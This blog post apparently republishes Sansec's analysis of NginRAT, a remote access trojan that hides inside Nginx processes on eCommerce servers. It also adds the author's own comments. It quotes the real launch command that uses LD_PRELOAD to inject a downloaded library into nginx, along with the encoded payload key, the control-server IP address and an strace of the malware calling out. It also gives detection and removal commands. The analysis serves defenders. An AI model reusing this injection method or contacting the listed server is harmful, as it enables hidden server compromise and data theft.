---
title: "NGINX: nginRAT - a remote access trojan injecting NGINX"
author: pravin_tripathi
date: 2024-03-14 00:00:00 +0530
readtime: true
media_subpath: /assets/img/nginx-understanding-and-deployment/
permalink: /nginx-understanding-and-deployment/nginrat-a-remote-access-trojan-injecting-nginx/
parent: /nginx-understanding-and-deployment/
categories: [Blogging, Article]
mermaid: true
tags: [softwareengineering, backenddevelopment, network-engineering, nginx]
image:
  path: header.png
  width: 1600   # in pixels
  height: 900   # in pixels
  alt: Generated using Copilot
---

A new parasitic malware targets the popular Nginx web server, Sansec discovered. This novel code injects itself into a host Nginx application and is nearly invisible. The parasite is used to steal data from eCommerce servers, also known as "server-side Magecart". The malware was found on servers in the US, Germany and France. In this post, we show you how to find and remove it.

![](sansec/676cb5c220d4f7938d9066862f4dc297.png)
_Image source: sansec.io_

Last week we exposed the [CronRAT](https://sansec.io/research/cronrat) eCommerce malware, which is controlled by a Chinese server. Out of curiosity, we wrote a "custom" RAT client and waited for commands from the far east. Eventually, the control server requested our fake RAT to launch another, more advanced piece of malware. We call it: NginRAT ("engine-rat").

NginRAT essentially hijacks a host Nginx application to masquerade its presence. To do that, NginRAT modifies core functionality of the Linux host system. When the legitimate Nginx web server uses such functionality (eg `dlopen`), NginRAT injects itself. The result is a remote access trojan that is embedded in the Nginx process. On a typical eCommerce web server, there are many Nginx processes. And the rogue Nginx looks just like the others. Can you spot the difference?

![](sansec/7464590e98dc13b791378afad15082fb.png)
_Image source: sansec.io_

So far, Sansec has identified NginRAT instances on eCommerce servers in the US, Germany and France. We suspect that more servers have been affected.

## **Technical analysis**

CronRAT talks with its control server at `47.115.46.167:443` using custom commands. One is `dwn`, which downloads a Linux system library to `/dev/shm/php-shared`. Then, CronRAT is instructed to launch:

```
env LD_L1BRARY_PATH="[580 bytes]" \
    LD_PRELOAD=/dev/shm/php-shared \
    /usr/sbin/nginx --help --help --help --help --help --help --help --help \
    --help --help --help --help --help --help --help --help --help --help --help \
    --help --help --help --help --help --help --help --help --help --help --help \
    --help --help --help --help --help --help --help --help --help --help --help \
    --help --help --help --help --help --help --help --help --help 1>&2 &

```

This "cry for help" effectively injects the NginRAT parasite into the host Nginx application. So what is going on here?

![](sansec/nginrat.png)
_Image source: sansec.io_

Two variables are passed to Nginx. The first is `LD_L1BRARY_PATH`. Noticed the `1` typo? It holds a decryption key for the RAT payload:

```
LJMESRJVJJKTGSKRJAZTGRCGG5NEISKWJ4QDCMZAG5EFIV2CIY2UWT2FKFMVIT2VKIQDCMD4KZBVUNCDEAZSAVCTIQ3UKSKDGNFE4MSZJ5DTKRCNJAZVQWBXJVFECSRUGJDUKR2RIVIECTCDKNEFAS2HIFCVSIBSHB6FOT2CJJGFOTCOK5JUWSKDJI2FKM22LFHDKT2OLJEUYWC2KBCUSIBRHEQDETCYKBKFAQJWGI3TMT2RKM3VCWCNIJGFAVJWGRDFIQJXKQ3U6TKFK5HDIWKILBHFSRKRIEQDEN34GYZEWM2KJBHUWRCZLFLFQTSHJI3E6TBSG5KTMQ2LLI3UKN2QK5ETKTJAGIYSAVCELJHDGNBVKNCVCSKTLJLTKMZAGEYHYUJUEAYSAV2ZKBFTKUJVI5ETESSKINKUQRZWKM3DOQJTJFLUIMSBJRJVSQKCJU3VISSKIE2VUR2HIRDU6NCJEAZDTVXSVLQCAVEEAQ6JZNKIUQ7WXU25XTJOBP7IQ42E4LW6YLHDDXVB4FYRLYWTHAIGBU4CABJKWPVGTV5SRGXYI5Q4QPB3LTEPU42JUSCA

```

The second is `LD_PRELOAD`, which is a Linux debugging feature. Developers use it to test new system libraries. However, it can also be used to intercept standard Linux library calls. As you can see, the malicious `php-shared` library intercepts `dlopen` and `dlsym`, which Nginx [uses](https://github.com/nginx/nginx/blob/a64190933e06758d50eea926e6a55974645096fd/src/os/unix/ngx_dlopen.h).

![](sansec/1dc7f2ec6042304ae4cd4f28fe95f822.png)
_Image source: sansec.io_

Once Nginx calls `dlopen`, NginRAT takes control. It removes the `php-shared` file, changes its process name to `nginx: worker process`, gathers information about the system and opens up a connection with the c&c server at `47.115.46.167`. It then awaits further commands, possibly sleeping for weeks or months.

```
// Partial strace of NginRAT
uname({sysname="Linux", nodename="ubuntu-2gb-fsn1-1", ...}) = 0
clone(child_stack=NULL, flags=CLONE_CHILD_CLEARTID|CHILD_SETTID|SIGCHLD, child_tidptr=0x7fb008b9d210) = 8949
openat(AT_FDCWD, "/proc/self/maps", O_RDONLY) = 3
getcwd("/dev/shm", 4096)          = 9
readlink("/proc/self/exe", "/usr/sbin/nginx", 4096) = 15
chdir("/usr/sbin")
openat(AT_FDCWD, "/proc/self/stat", O_RDONLY|O_CLOEXEC) = 3
openat(AT_FDCWD, "/dev/shm/php-shared", O_RDONLY) = 3
connect(3, {sa_family=AF_INET, sin_port=htons(443), sin_addr=inet_addr("47.115.46.167")}, 16) = ? ERESTARTSYS (To be restarted if SA_RESTART is set)

```

A traffic dump of the initial NginRAT handshake with the control server:

![](sansec/c0c0d0362f9cde19c36b3fb7e25b0868.png)
_Image source: sansec.io_

## **How to detect and remove NginRAT**

Because NginRAT embeds itself into a legitimate Nginx host process, the standard `/proc/PID/exe` will point to Nginx, not to the malware. Also, the library code is never written to disk and cannot be examined after its launch. However, the use of `LD_L1BRARY_PATH` (with typo) may reveal the presence of this particular NginRAT version. In order to find any active processes, run this command:

```
$ sudo grep -al LD_L1BRARY_PATH /proc/*/environ | grep -v self/
/proc/17199/environ
/proc/25074/environ

```

It will show any compromised processes. Kill all of them with `kill -9 <PID>`. Be sure to check our [CronRAT analysis](https://sansec.io/research/cronrat) as well, because you likely have malware in your cron tasks.

### Feedback

A new discovered “parasite” nginRAT (named by Sansec) works by injecting itself into a legitimate NGINX process and phones home details about the NGINX server to its C&C.

I do have few doubts about the severity of this trojan though. My understanding from the article is it requires the NGINX server to be already infected with a cronRAT which listens for C&C commands. The cronRAT receives a new payload to run (nginRAT), this payload is decrypted and executed. The cronRAT attempts to start a new nginx process with some env variables which enables linux debugging. When nginx starts it does a *dlopen* to read something from disk (my guess is the default NGINX configuration) the open command launches nginRAT (defined on the env variable LD_PRELOAD ) which is a linux debugging tool. This effectively launches nginRAT in the nginx process which now has access to pretty much everything the nginx worker process has. And it is hidden in plain sight!

I am not sure however if nginRAT can intercept HTTP requests or alter responses. It probably can but I can’t imagine this being easy. Can’t wait for more detailed analysis on the nature of this.

I mean just sending the private key of the cert (which is conveniently available in the nginx config) to the C&C is enough of a disaster. Another reason why I like explicit configuration (-c config).

In the grand scheme of things, if your server already has a RAT you are already screwed. I do understand the elevation of privileges though in this case.

Good find sansec

[Back to Parent Page]({{ page.parent }})